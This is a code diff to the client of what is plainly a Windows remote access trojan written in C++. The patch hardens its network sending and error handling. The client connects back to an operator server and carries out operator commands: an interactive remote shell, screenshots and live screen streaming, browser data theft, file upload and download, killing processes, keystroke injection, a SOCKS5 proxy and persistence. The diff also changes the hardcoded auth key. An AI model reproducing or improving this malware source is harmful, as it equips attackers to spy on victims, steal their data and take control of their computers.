@@ -30,13 +30,13 @@
 using namespace Gdiplus;
 
 #define PORT 8888
-#define BUFFER_SIZE 1024
+#define BUFFER_SIZE 8192  // Increased for better command handling
 #define SERVER_IP "127.0.0.1" // Change to your server IP
 
 // ===== AUTHENTICATION KEY =====
 // IMPORTANT: Change this key before compiling the client!
 // This key must match the server authentication key
-#define AUTH_KEY "TxTxT" // Change this to your custom authentication key
+#define AUTH_KEY "nittin" // Change this to your custom authentication key
 // ================================
 
 // Screen sharing globals
@@ -57,6 +57,8 @@ static std::vector<SOCKET> g_proxy_client_sockets;
 // Forward declarations for all functions
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
 void establish_persistence();
+bool safe_send(SOCKET sock, const char* data, int length);
+bool is_socket_connected(SOCKET sock);
 std::string get_sysinfo();
 bool receive_file(SOCKET sock, const std::string& destination_path);
 bool send_file(SOCKET sock, const std::string& file_path);
@@ -493,19 +495,19 @@ bool capture_and_send_screenshot(SOCKET sock)
     {
         size_bytes[7 - i] = (size >> (i * 8)) & 0xFF;
     }
-    send(sock, (char *)size_bytes, 8, 0);
+    if (!safe_send(sock, (char *)size_bytes, 8)) {
+        return false;
+    }
 
     // Then send the file data
     int total_sent = 0;
     while (total_sent < streamSize)
     {
         int chunk_size = (streamSize - total_sent < 1024) ? static_cast<int>(streamSize - total_sent) : 1024;
-        int sent = send(sock, (char *)buffer.data() + total_sent, chunk_size, 0);
-        if (sent <= 0)
-        {
+        if (!safe_send(sock, (char *)buffer.data() + total_sent, chunk_size)) {
             break;
         }
-        total_sent += sent;
+        total_sent += chunk_size;
     }
 
     // Clean up
@@ -605,7 +607,9 @@ DWORD WINAPI screen_sharing_thread(LPVOID lpParam)
     
     // Send screen sharing start marker
     const char* start_marker = "##SCREEN_SHARE_START##";
-    send(sock, start_marker, strlen(start_marker), 0);
+    if (!safe_send(sock, start_marker, strlen(start_marker))) {
+        return 0; // Exit thread on send failure
+    }
     
     while (true) {
         EnterCriticalSection(&g_screen_sharing_cs);
@@ -625,7 +629,7 @@ DWORD WINAPI screen_sharing_thread(LPVOID lpParam)
             sizeBytes[2] = (frameSize >> 16) & 0xFF;
             sizeBytes[3] = (frameSize >> 24) & 0xFF;
             
-            if (send(sock, sizeBytes, 4, 0) <= 0) {
+            if (!safe_send(sock, sizeBytes, 4)) {
                 break; // Connection lost
             }
             
@@ -633,11 +637,10 @@ DWORD WINAPI screen_sharing_thread(LPVOID lpParam)
             DWORD totalSent = 0;
             while (totalSent < frameSize) {
                 DWORD chunkSize = (frameSize - totalSent < 8192) ? (frameSize - totalSent) : 8192; // 8KB chunks
-                int sent = send(sock, (char*)frameBuffer.data() + totalSent, chunkSize, 0);
-                if (sent <= 0) {
+                if (!safe_send(sock, (char*)frameBuffer.data() + totalSent, chunkSize)) {
                     goto thread_exit; // Connection lost
                 }
-                totalSent += sent;
+                totalSent += chunkSize;
             }
         }
         
@@ -648,7 +651,7 @@ DWORD WINAPI screen_sharing_thread(LPVOID lpParam)
 thread_exit:
     // Send screen sharing end marker
     const char* end_marker = "##SCREEN_SHARE_END##";
-    send(sock, end_marker, strlen(end_marker), 0);
+    safe_send(sock, end_marker, strlen(end_marker)); // Don't check return since we're exiting
     
     return 0;
 }
@@ -815,7 +818,7 @@ std::string get_public_ip() {
                 request += "Accept: text/plain\r\n";
                 request += "Connection: close\r\n\r\n";
                 
-                if (send(sock, request.c_str(), request.length(), 0) != SOCKET_ERROR) {
+                if (safe_send(sock, request.c_str(), request.length())) {
                     char buffer[1024] = {0};
                     int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
                     
@@ -1703,12 +1706,19 @@ int safe_recv(SOCKET sock, char* buffer, int buffer_size) {
     if (bytes_received == SOCKET_ERROR) {
         int error = WSAGetLastError();
         if (error == WSAETIMEDOUT) {
-            std::cout << "Receive timeout" << std::endl;
+            std::cout << "Receive timeout - server may be processing large response" << std::endl;
+        } else if (error == WSAECONNRESET || error == WSAECONNABORTED) {
+            std::cout << "Connection reset by server, error: " << error << std::endl;
         } else {
             std::cout << "Receive error: " << error << std::endl;
         }
         return -1;
+    } else if (bytes_received == 0) {
+        std::cout << "Server closed connection gracefully" << std::endl;
+        return 0;
     }
+    
+    std::cout << "Received " << bytes_received << " bytes from server" << std::endl;
     return bytes_received;
 }
 
@@ -1779,7 +1789,10 @@ bool interactive_shell(SOCKET sock)
 
     // Send shell start marker
     const char* shell_start = "##SHELL_SESSION_STARTED##";
-    send(sock, shell_start, strlen(shell_start), 0);
+    if (!safe_send(sock, shell_start, strlen(shell_start))) {
+        std::cout << "Failed to send shell start marker" << std::endl;
+        return "Failed to start shell session - connection error";
+    }
 
     // Create a thread to read from the socket and write to the process stdin
     HANDLE hReadThread = CreateThread(NULL, 0, [](LPVOID param) -> DWORD {
@@ -1810,11 +1823,38 @@ bool interactive_shell(SOCKET sock)
             std::string command = buffer;
             command += "\r\n";
             
-            // Write to process stdin
+            // Validate handle before writing
+            if (hStdInWr == NULL || hStdInWr == INVALID_HANDLE_VALUE) {
+                std::cout << "Invalid stdin handle, shell process may have terminated" << std::endl;
+                break;
+            }
+            
+            // Write to process stdin with better error handling
             DWORD bytesWritten;
             if (!WriteFile(hStdInWr, command.c_str(), command.length(), &bytesWritten, NULL)) {
-                std::cout << "Failed to write to process stdin, connection may be lost" << std::endl;
+                DWORD error = GetLastError();
+                std::cout << "Failed to write to process stdin, error: " << error;
+                
+                switch(error) {
+                    case ERROR_INVALID_HANDLE:
+                        std::cout << " (Invalid Handle - pipe closed)" << std::endl;
+                        break;
+                    case ERROR_BROKEN_PIPE:
+                        std::cout << " (Broken Pipe - process terminated)" << std::endl;
+                        break;
+                    case ERROR_NO_DATA:
+                        std::cout << " (No Data - pipe closing)" << std::endl;
+                        break;
+                    default:
+                        std::cout << " (Unknown error)" << std::endl;
+                        break;
+                }
                 break;
+            }
+            
+            // Verify all bytes were written
+            if (bytesWritten != command.length()) {
+                std::cout << "Partial write to stdin: " << bytesWritten << "/" << command.length() << " bytes" << std::endl;
             }
         }
         
@@ -1834,7 +1874,9 @@ bool interactive_shell(SOCKET sock)
     
     // Send initial prompt
     const char* prompt = "\r\nC:\\> ";
-    send(sock, prompt, strlen(prompt), 0);
+    if (!safe_send(sock, prompt, strlen(prompt))) {
+        std::cout << "Failed to send initial shell prompt" << std::endl;
+    }
     
     while (true) {
         // Check if process is still running
@@ -3324,7 +3366,10 @@ bool send_file(SOCKET sock, const std::string& file_path)
         
         // Send file size (8 bytes) in big-endian format for consistency
         uint64_t file_size_be = _byteswap_uint64(file_size);
-        send(sock, reinterpret_cast<char*>(&file_size_be), 8, 0);
+        if (!safe_send(sock, reinterpret_cast<char*>(&file_size_be), 8)) {
+            std::cout << "Failed to send file size" << std::endl;
+            return false;
+        }
         
         // Send file name (for the server to extract)
         std::string file_name = file_path.substr(file_path.find_last_of("\\/") + 1);
@@ -3332,8 +3377,14 @@ bool send_file(SOCKET sock, const std::string& file_path)
         
         // Send name length as 8 bytes (little-endian for Windows)
         uint64_t name_length_64 = static_cast<uint64_t>(name_length);
-        send(sock, reinterpret_cast<char*>(&name_length_64), 8, 0);
-        send(sock, file_name.c_str(), name_length, 0);
+        if (!safe_send(sock, reinterpret_cast<char*>(&name_length_64), 8)) {
+            std::cout << "Failed to send filename length" << std::endl;
+            return false;
+        }
+        if (!safe_send(sock, file_name.c_str(), name_length)) {
+            std::cout << "Failed to send filename" << std::endl;
+            return false;
+        }
         
         // Send the file in chunks
         const int chunk_size = 8192; // 8KB chunks
@@ -3351,16 +3402,13 @@ bool send_file(SOCKET sock, const std::string& file_path)
             if (bytes_read <= 0)
                 break;
                 
-            int bytes_sent = send(sock, buffer, bytes_read, 0);
-            
-            if (bytes_sent <= 0)
-            {
+            if (!safe_send(sock, buffer, bytes_read)) {
                 std::cout << "Connection error while sending file" << std::endl;
                 file.close();
                 return false;
             }
             
-            total_sent += bytes_sent;
+            total_sent += bytes_read;
             
             // Print progress percentage
             double progress = (static_cast<double>(total_sent) / file_size) * 100.0;
@@ -3520,8 +3568,8 @@ int main()
         int keepalive = 1;
         setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (char*)&keepalive, sizeof(keepalive));
         
-        // Set receive timeout
-        DWORD timeout = 30000; // 30 seconds
+        // Set receive timeout - increased for large responses like sysinfo
+        DWORD timeout = 60000; // 60 seconds for better command handling
         setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
         setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
 
@@ -3649,36 +3697,70 @@ int main()
                 std::cout << "Sending system information..." << std::endl;
                 response = get_sysinfo();
 
-                // Send in chunks with a clear end marker
-                const int chunk_size = 1024;
-                for (size_t i = 0; i < response.length(); i += chunk_size)
+                // Send in chunks with a clear end marker using safe_send
+                const int chunk_size = 4096; // Increased chunk size for better performance
+                bool send_success = true;
+                size_t total_chunks = (response.length() + chunk_size - 1) / chunk_size;
+                size_t chunk_count = 0;
+                
+                std::cout << "Sending sysinfo in " << total_chunks << " chunks..." << std::endl;
+                
+                for (size_t i = 0; i < response.length() && send_success; i += chunk_size)
                 {
                     std::string chunk = response.substr(i, chunk_size);
-                    send(sock, chunk.c_str(), chunk.length(), 0);
-                    Sleep(50); // Small delay between chunks
+                    chunk_count++;
+                    
+                    if (!safe_send(sock, chunk.c_str(), chunk.length())) {
+                        std::cout << "Failed to send sysinfo chunk " << chunk_count << "/" << total_chunks << std::endl;
+                        send_success = false;
+                        connected_successfully = false;
+                        break;
+                    }
+                    
+                    if (chunk_count % 5 == 0) { // Progress every 5 chunks
+                        std::cout << "Sent chunk " << chunk_count << "/" << total_chunks << std::endl;
+                    }
+                    
+                    Sleep(25); // Reduced delay for better performance
                 }
 
                 // Send a special end marker
-                const char *end_marker = "##END_OF_SYSINFO##";
-                send(sock, end_marker, strlen(end_marker), 0);
+                if (send_success) {
+                    const char *end_marker = "##END_OF_SYSINFO##";
+                    if (!safe_send(sock, end_marker, strlen(end_marker))) {
+                        std::cout << "Failed to send sysinfo end marker" << std::endl;
+                        connected_successfully = false;
+                    }
+                }
             }
             else if (strcmp(buffer, "list_processes") == 0)
             {
                 std::cout << "Listing all processes..." << std::endl;
                 response = list_processes();
 
-                // Send in chunks with a clear end marker
+                // Send in chunks with a clear end marker using safe_send
                 const int chunk_size = 1024;
-                for (size_t i = 0; i < response.length(); i += chunk_size)
+                bool send_success = true;
+                for (size_t i = 0; i < response.length() && send_success; i += chunk_size)
                 {
                     std::string chunk = response.substr(i, chunk_size);
-                    send(sock, chunk.c_str(), chunk.length(), 0);
+                    if (!safe_send(sock, chunk.c_str(), chunk.length())) {
+                        std::cout << "Failed to send process list chunk" << std::endl;
+                        send_success = false;
+                        connected_successfully = false;
+                        break;
+                    }
                     Sleep(50); // Small delay between chunks
                 }
 
                 // Send a special end marker
-                const char *end_marker = "##END_OF_PROCESS_LIST##";
-                send(sock, end_marker, strlen(end_marker), 0);
+                if (send_success) {
+                    const char *end_marker = "##END_OF_PROCESS_LIST##";
+                    if (!safe_send(sock, end_marker, strlen(end_marker))) {
+                        std::cout << "Failed to send process list end marker" << std::endl;
+                        connected_successfully = false;
+                    }
+                }
             }
             else if (strncmp(buffer, "start_process ", 14) == 0)
             {
@@ -3734,19 +3816,31 @@ int main()
                     response = "Failed to start process: File not found at path: " + command;
                 }
 
-                send(sock, response.c_str(), response.length(), 0);
+                if (!safe_send(sock, response.c_str(), response.length())) {
+                    std::cout << "Failed to send process start response" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
             }
             else if (strcmp(buffer, "browser_data") == 0)
             {
                 std::string browserData = get_browser_data();
-                send(sock, browserData.c_str(), browserData.length(), 0);
+                if (!safe_send(sock, browserData.c_str(), browserData.length())) {
+                    std::cout << "Failed to send browser data" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
             }
             else if (strncmp(buffer, "terminate_process ", 18) == 0)
             {
                 std::string pid = buffer + 18;
                 std::cout << "Terminating process with PID: " << pid << std::endl;
                 response = terminate_process(pid);
-                send(sock, response.c_str(), response.length(), 0);
+                if (!safe_send(sock, response.c_str(), response.length())) {
+                    std::cout << "Failed to send terminate process response" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
             }
             else if (strcmp(buffer, "screenshot") == 0)
             {
@@ -3754,7 +3848,11 @@ int main()
                 if (!capture_and_send_screenshot(sock))
                 {
                     const char *error_msg = "Failed to capture screenshot";
-                    send(sock, error_msg, strlen(error_msg), 0);
+                    if (!safe_send(sock, error_msg, strlen(error_msg))) {
+                        std::cout << "Failed to send screenshot error message" << std::endl;
+                        connected_successfully = false;
+                        break;
+                    }
                 }
                 std::cout << "Screenshot sent" << std::endl;
             }
@@ -3762,14 +3860,22 @@ int main()
             {
                 std::cout << "Starting screen sharing..." << std::endl;
                 response = start_screen_sharing(sock);
-                send(sock, response.c_str(), response.length(), 0);
+                if (!safe_send(sock, response.c_str(), response.length())) {
+                    std::cout << "Failed to send screen sharing response" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
                 std::cout << "Screen sharing command processed: " << response << std::endl;
             }
             else if (strcmp(buffer, "stop_screen_share") == 0)
             {
                 std::cout << "Stopping screen sharing..." << std::endl;
                 response = stop_screen_sharing();
-                send(sock, response.c_str(), response.length(), 0);
+                if (!safe_send(sock, response.c_str(), response.length())) {
+                    std::cout << "Failed to send stop screen sharing response" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
                 std::cout << "Screen sharing stopped: " << response << std::endl;
             }
             else if (strcmp(buffer, "start_proxy") == 0 || strncmp(buffer, "start_proxy ", 12) == 0)
@@ -3792,21 +3898,33 @@ int main()
                 }
                 
                 response = start_socks5_proxy(port);
-                send(sock, response.c_str(), response.length(), 0);
+                if (!safe_send(sock, response.c_str(), response.length())) {
+                    std::cout << "Failed to send start proxy response" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
                 std::cout << "SOCKS5 proxy command processed: " << response << std::endl;
             }
             else if (strcmp(buffer, "stop_proxy") == 0)
             {
                 std::cout << "Stopping SOCKS5 proxy..." << std::endl;
                 response = stop_socks5_proxy();
-                send(sock, response.c_str(), response.length(), 0);
+                if (!safe_send(sock, response.c_str(), response.length())) {
+                    std::cout << "Failed to send stop proxy response" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
                 std::cout << "SOCKS5 proxy stopped: " << response << std::endl;
             }
             else if (strcmp(buffer, "proxy_status") == 0)
             {
                 std::cout << "Getting SOCKS5 proxy status..." << std::endl;
                 response = get_proxy_status();
-                send(sock, response.c_str(), response.length(), 0);
+                if (!safe_send(sock, response.c_str(), response.length())) {
+                    std::cout << "Failed to send proxy status" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
                 std::cout << "SOCKS5 proxy status: " << response << std::endl;
             }
             else if (strcmp(buffer, "get_public_ip_info") == 0)
@@ -3828,7 +3946,11 @@ int main()
                 response = "Public IP: " + public_ip + "\n";
                 response += "Local IP: " + local_ip;
                 
-                send(sock, response.c_str(), response.length(), 0);
+                if (!safe_send(sock, response.c_str(), response.length())) {
+                    std::cout << "Failed to send public IP info" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
                 std::cout << "Public IP info sent: " << public_ip << std::endl;
             }
             else if (strcmp(buffer, "kill_client") == 0)
@@ -3836,7 +3958,7 @@ int main()
                 std::cout << "Received kill command from server. Terminating..." << std::endl;
                 // Send acknowledgment before terminating
                 const char *ack_msg = "Client terminating on server request";
-                send(sock, ack_msg, strlen(ack_msg), 0);
+                safe_send(sock, ack_msg, strlen(ack_msg)); // Don't break on failure since we're terminating anyway
 
                 // Clean up resources
                 closesocket(sock);
@@ -3850,7 +3972,7 @@ int main()
             {
                 std::cout << "Disconnecting from server (will attempt to reconnect)..." << std::endl;
                 const char *ack_msg = "Client disconnecting but will attempt to reconnect";
-                send(sock, ack_msg, strlen(ack_msg), 0);
+                safe_send(sock, ack_msg, strlen(ack_msg)); // Don't break on failure since we're disconnecting
 
                 // Close the current socket but don't exit the process
                 closesocket(sock);
@@ -3867,7 +3989,11 @@ int main()
                 
                 // Send acknowledgment
                 response = "Starting interactive shell...";
-                send(sock, response.c_str(), response.length(), 0);
+                if (!safe_send(sock, response.c_str(), response.length())) {
+                    std::cout << "Failed to send shell acknowledgment" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
                 
                 // Start interactive shell
                 interactive_shell(sock);
@@ -3879,7 +4005,7 @@ int main()
             {
                 std::cout << "Received kill command, exiting..." << std::endl;
                 response = "Client shutting down";
-                send(sock, response.c_str(), response.length(), 0);
+                safe_send(sock, response.c_str(), response.length()); // Don't break on failure since we're exiting
                 break;
             }
             else if (strcmp(buffer, "installed_software") == 0)
@@ -3887,18 +4013,29 @@ int main()
                 std::cout << "Sending installed software list..." << std::endl;
                 response = get_installed_software();
 
-                // Send in chunks with a clear end marker
+                // Send in chunks with a clear end marker using safe_send
                 const int chunk_size = 1024;
-                for (size_t i = 0; i < response.length(); i += chunk_size)
+                bool send_success = true;
+                for (size_t i = 0; i < response.length() && send_success; i += chunk_size)
                 {
                     std::string chunk = response.substr(i, chunk_size);
-                    send(sock, chunk.c_str(), chunk.length(), 0);
+                    if (!safe_send(sock, chunk.c_str(), chunk.length())) {
+                        std::cout << "Failed to send software list chunk" << std::endl;
+                        send_success = false;
+                        connected_successfully = false;
+                        break;
+                    }
                     Sleep(50); // Small delay between chunks
                 }
 
                 // Send a special end marker
-                const char *end_marker = "##END_OF_SOFTWARE_LIST##";
-                send(sock, end_marker, strlen(end_marker), 0);
+                if (send_success) {
+                    const char *end_marker = "##END_OF_SOFTWARE_LIST##";
+                    if (!safe_send(sock, end_marker, strlen(end_marker))) {
+                        std::cout << "Failed to send software list end marker" << std::endl;
+                        connected_successfully = false;
+                    }
+                }
             }
             else if (strncmp(buffer, "send_keys ", 10) == 0)
             {
@@ -3991,16 +4128,27 @@ int main()
                 response = search_process(process_name);
 
                 // Send the response
-                send(sock, response.c_str(), response.length(), 0);
+                if (!safe_send(sock, response.c_str(), response.length())) {
+                    std::cout << "Failed to send search results" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
 
                 // Send the end marker separately
                 const char *end_marker = "##END_OF_SEARCH_RESULTS##";
-                send(sock, end_marker, strlen(end_marker), 0);
+                if (!safe_send(sock, end_marker, strlen(end_marker))) {
+                    std::cout << "Failed to send search results end marker" << std::endl;
+                    connected_successfully = false;
+                }
             }
             else if (strcmp(buffer, "network") == 0)
             {
                 std::string network_info = get_network_info();
-                send(sock, network_info.c_str(), network_info.length(), 0);
+                if (!safe_send(sock, network_info.c_str(), network_info.length())) {
+                    std::cout << "Failed to send network info" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
             }
             else if (strcmp(buffer, "system_logs") == 0 || strncmp(buffer, "system_logs ", 12) == 0)
             {
@@ -4024,26 +4172,38 @@ int main()
                         if (token)
                         {
                             num_entries = atoi(token);
-                            if (num_entries <= 0)
+                            if (num_entries <= 0) {
                                 num_entries = 50;
+                            }
                         }
-                    }
                 }
 
+                // Get system logs
                 response = get_system_logs(log_type, num_entries);
 
-                // Send in chunks with a clear end marker
-                const int chunk_size = 1024;
-                for (size_t i = 0; i < response.length(); i += chunk_size)
+                // Send in chunks with safe_send
+                const int chunk_size = 4096; // Increased for better performance
+                bool send_success = true;
+                for (size_t i = 0; i < response.length() && send_success; i += chunk_size)
                 {
                     std::string chunk = response.substr(i, chunk_size);
-                    send(sock, chunk.c_str(), chunk.length(), 0);
-                    Sleep(50); // Small delay between chunks
+                    if (!safe_send(sock, chunk.c_str(), chunk.length())) {
+                        std::cout << "Failed to send system logs chunk" << std::endl;
+                        send_success = false;
+                        connected_successfully = false;
+                        break;
+                    }
+                    Sleep(25); // Reduced delay for better performance
                 }
 
                 // Send a special end marker
-                const char *end_marker = "##END_OF_SYSTEM_LOGS##";
-                send(sock, end_marker, strlen(end_marker), 0);
+                if (send_success) {
+                    const char *end_marker = "##END_OF_SYSTEM_LOGS##";
+                    if (!safe_send(sock, end_marker, strlen(end_marker))) {
+                        std::cout << "Failed to send system logs end marker" << std::endl;
+                        connected_successfully = false;
+                    }
+                }
             }
             else if (strncmp(buffer, "upload_file ", 12) == 0)
             {
@@ -4071,7 +4231,11 @@ int main()
                 // Send acknowledgment before receiving file
                 response = "Ready to receive file";
                 std::cout << "DEBUG: Sending acknowledgment: " << response << std::endl;
-                send(sock, response.c_str(), response.length(), 0);
+                if (!safe_send(sock, response.c_str(), response.length())) {
+                    std::cout << "Failed to send upload acknowledgment" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
                 
                 // Small delay to ensure server receives acknowledgment
                 Sleep(200);
@@ -4123,14 +4287,22 @@ int main()
                 {
                     response = "File not found: " + file_path;
                     std::cout << "DEBUG: File not found, sending error response" << std::endl;
-                    send(sock, response.c_str(), response.length(), 0);
+                    if (!safe_send(sock, response.c_str(), response.length())) {
+                        std::cout << "Failed to send file not found response" << std::endl;
+                        connected_successfully = false;
+                        break;
+                    }
                 }
                 else
                 {
                     // Send acknowledgment before sending file
                     response = "File found, preparing to send";
                     std::cout << "DEBUG: File found, sending acknowledgment" << std::endl;
-                    send(sock, response.c_str(), response.length(), 0);
+                    if (!safe_send(sock, response.c_str(), response.length())) {
+                        std::cout << "Failed to send file acknowledgment" << std::endl;
+                        connected_successfully = false;
+                        break;
+                    }
                     
                     // Small delay to ensure acknowledgment is received
                     Sleep(100);
@@ -4153,13 +4325,19 @@ int main()
             {
                 std::cout << "Unknown command: " << buffer << std::endl;
                 response = "Unknown command";
-                send(sock, response.c_str(), response.length(), 0);
+                if (!safe_send(sock, response.c_str(), response.length())) {
+                    std::cout << "Failed to send unknown command response" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
             }
-        }
+        } // End of command processing loop
         
         // If we reach here, connection was lost or commands finished
         closesocket(sock);
         sock = INVALID_SOCKET;
+        
+    } // End of connection attempt block
         
         // If connection was lost, reset and attempt reconnection
         if (!connected_successfully) {
@@ -4178,7 +4356,7 @@ int main()
             keep_running = false;
             break;
         }
-    }
+    } // End of main operation loop
     
     // Cleanup
     if (sock != INVALID_SOCKET) {
